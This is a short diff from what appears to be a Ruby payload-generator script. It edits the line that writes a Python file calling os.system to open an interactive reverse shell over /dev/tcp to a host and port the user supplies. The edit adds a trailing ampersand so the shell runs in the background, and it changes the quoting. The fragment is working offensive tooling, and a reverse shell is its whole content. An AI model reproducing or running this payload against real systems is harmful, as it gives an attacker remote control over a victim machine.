@@ -45,6 +45,6 @@ puts "#{g}Writing payload..."
 sleep(1)
 open(file, 'w') { |f|
     f.puts "import os"
-    f.puts "os.system('#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1')"
+    f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
 }
         
